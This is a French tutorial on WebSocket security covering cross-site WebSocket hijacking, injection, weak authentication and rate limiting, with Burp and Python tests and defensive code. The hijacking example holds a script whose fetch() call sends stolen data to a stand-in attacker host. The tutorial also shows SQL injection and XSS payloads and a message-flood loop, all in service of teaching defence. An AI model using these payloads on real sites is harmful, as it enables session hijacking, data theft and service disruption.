---
title: WebSocket Security
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [websocket, web, csrf, injection, sécurité, bug-bounty]
date: 2026-03-22
---

# WebSocket Security

Les WebSockets permettent une communication bidirectionnelle et persistante entre le navigateur et le serveur. Contrairement à HTTP, la connexion reste ouverte. Cela introduit des risques spécifiques différents du HTTP classique.

## Handshake WebSocket

La connexion commence par un upgrade HTTP puis bascule vers le protocole WebSocket.

```
Client → Serveur (HTTP Upgrade) :
GET /chat HTTP/1.1
Host: site.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==   ← Nonce Base64
Sec-WebSocket-Version: 13

Serveur → Client (101 Switching Protocols) :
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=   ← Hash du nonce
```

Après cet échange, la connexion TCP reste ouverte et les deux parties peuvent s'envoyer des messages (frames) dans les deux sens.

## Vulnérabilités principales

### 1. Cross-Site WebSocket Hijacking (CSWSH)

Équivalent du CSRF pour les WebSockets. Le handshake WebSocket envoie les cookies automatiquement (comme HTTP), mais ne vérifie pas l'origine si le serveur ne le fait pas.

```html
<!-- Page malveillante sur evil.com -->
<script>
var ws = new WebSocket('wss://site.com/chat');
// Le navigateur envoie les cookies de session de la victime !

ws.onopen = function() {
    // Envoyer des commandes au nom de la victime
    ws.send('{"action": "get_messages"}');
    ws.send('{"action": "transfer", "amount": 1000, "to": "attaquant"}');
};

ws.onmessage = function(event) {
    // Exfiltrer les données vers le serveur de l'attaquant
    fetch('https://attaquant.com/collect', {
        method: 'POST',
        body: event.data
    });
};
</script>
```

**Condition de vulnérabilité :**
- L'authentification est basée sur les cookies (envoyés automatiquement)
- Le serveur ne vérifie pas l'en-tête `Origin` du handshake

**Test :**
```bash
# Vérifier si le serveur valide l'Origin
# Dans Burp, modifier Origin: https://attaquant.com dans le handshake
# Si la connexion s'établit → vulnérable au CSWSH
```

### 2. Injection WebSocket

Les messages WebSocket ne sont pas à l'abri des injections classiques si les données ne sont pas validées.

```javascript
// Injection SQL via WebSocket
ws.send('{"action": "search", "query": "' + userInput + '"}');
// Si query est : test"; DROP TABLE users; --
// → SQL injection dans le message WebSocket

// XSS via message WebSocket réfléchi
// Côté client — affichage vulnérable du message reçu :
ws.onmessage = function(event) {
    const data = JSON.parse(event.data);
    document.getElementById('output').innerHTML = data.message;  // XSS !
};

// XSS stocké via WebSocket
// L'attaquant envoie un message avec un payload XSS
ws.send('{"type": "message", "content": "<script>alert(1)</script>"}');
// Si le serveur stocke et rediffuse ce message → XSS stocké pour tous les clients
```

### 3. Authentification insuffisante

```javascript
// MAUVAIS — authentification uniquement lors du handshake
// Si un token court-circuite l'auth du handshake

// Pas de re-vérification des permissions à chaque message
ws.onmessage = function(msg) {
    const data = JSON.parse(msg.data);
    // data.action peut être "admin_delete_user" sans vérification de rôle
    handleAction(data.action, data.params);
};

// BIEN — vérifier l'auth et les permissions à chaque message
ws.onmessage = function(msg) {
    const data = JSON.parse(msg.data);
    const user = verifyToken(data.token);  // Token dans chaque message
    if (!hasPermission(user, data.action)) {
        ws.send(JSON.stringify({error: "Unauthorized"}));
        return;
    }
    handleAction(data.action, data.params, user);
};
```

### 4. Manque de limitation de débit (Rate Limiting)

Les WebSockets maintiennent une connexion persistante — un client peut envoyer des milliers de messages par seconde sans les limites HTTP habituelles.

```javascript
// Attaque : envoyer des milliers de messages pour saturer le serveur
const ws = new WebSocket('wss://site.com/chat');
ws.onopen = () => {
    for (let i = 0; i < 100000; i++) {
        ws.send('{"action": "heavy_operation"}');
    }
};
```

## Test avec Burp Suite

```
1. Burp Suite intercepte les WebSockets automatiquement
   → Proxy → WebSockets history

2. Modifier les messages dans l'onglet Repeater
   → Clic droit sur un message → "Send to Repeater"
   → Modifier et réémettre les messages

3. Tester le CSWSH :
   → Onglet Repeater → modifier l'en-tête Origin dans le handshake
   → Si la connexion s'établit avec Origin: https://evil.com → vulnérable

4. Tester les injections :
   → Ajouter des payloads SQLi/XSS dans les champs des messages JSON
```

```python
# Test Python avec websockets
import asyncio
import websockets

async def test_cswsh():
    headers = {
        'Cookie': 'session=VOTRE_SESSION_VALIDE',
        'Origin': 'https://attaquant.com'  # Origin différent
    }
    async with websockets.connect(
        'wss://site.com/ws',
        additional_headers=headers
    ) as ws:
        await ws.send('{"action": "get_private_data"}')
        response = await ws.recv()
        print(f"Réponse : {response}")

asyncio.run(test_cswsh())
```

## Contre-mesures

```python
# Python — vérification de l'Origin (Flask-SocketIO)
from flask_socketio import SocketIO, disconnect

socketio = SocketIO(app, cors_allowed_origins=['https://site.com'])

# Vérification manuelle dans le handler de connexion
@socketio.on('connect')
def on_connect():
    origin = request.headers.get('Origin', '')
    if origin not in ALLOWED_ORIGINS:
        disconnect()
        return False

# Node.js — ws library
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    const origin = req.headers['origin'];
    const allowedOrigins = ['https://site.com'];

    if (!allowedOrigins.includes(origin)) {
        ws.close(4001, 'Origin not allowed');
        return;
    }

    // Rate limiting
    let messageCount = 0;
    const resetInterval = setInterval(() => messageCount = 0, 1000);

    ws.on('message', (data) => {
        messageCount++;
        if (messageCount > 100) {  // Max 100 messages/seconde
            ws.close(4002, 'Rate limit exceeded');
            clearInterval(resetInterval);
            return;
        }
        // Traitement sécurisé...
    });
});
```

```
Checklist sécurité WebSocket :
✓ Vérifier l'en-tête Origin lors du handshake
✓ Authentifier chaque message (token dans le payload)
✓ Vérifier les permissions à chaque action
✓ Valider et encoder les données reçues (protection injection)
✓ Implémenter un rate limiting par connexion
✓ Utiliser WSS (WebSocket Secure = WebSocket sur TLS)
✓ Limiter la taille des messages
✓ Logger les connexions et les actions sensibles
```
